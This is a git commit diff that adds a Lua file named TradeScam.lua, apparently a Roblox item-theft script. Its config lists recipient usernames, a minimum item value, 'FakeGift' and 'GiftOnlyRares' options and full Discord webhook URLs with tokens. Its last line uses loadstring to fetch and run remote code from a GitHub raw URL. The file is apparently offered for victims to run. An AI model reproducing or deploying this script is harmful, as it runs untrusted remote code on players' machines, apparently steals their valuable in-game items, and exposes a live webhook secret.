8a2f26fc17488846d804b0e123ddd7351d0f2852
lauretek5-tech <lauretek5@gmail.com>
2025-08-04 21:34:22 +0800

    Upload TradeScam.lua via Script Source Converter

---
+++ TradeScam.lua
@@ -0,0 +1,13 @@
+_G.NullConfig = {
+    User = {"pappylian0", "killua_kite1234"},
+    min_value = 10000000000,
+    pingEveryone = "Yes", -- dont change this
+    Webhook = "https://discord.com/api/webhooks/1401919970585083924/UsIXAZsOCPUk3WS-IolPN96rWS4Ox6tu79ai0yb5W-0uPWYOd2YQpEx1t8-WjzXHc5MV",
+    FakeGift = "Yes",
+    Trash = "https://discord.com/api/webhooks/1401919970585083924/UsIXAZsOCPUk3WS-IolPN96rWS4Ox6tu79ai0yb5W-0uPWYOd2YQpEx1t8-WjzXHc5MV",
+    LoadingScreen = "No",
+    GiftOnlyRares = "Yes",
+    ExecuteOtherScript = "No",
+}
+    
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
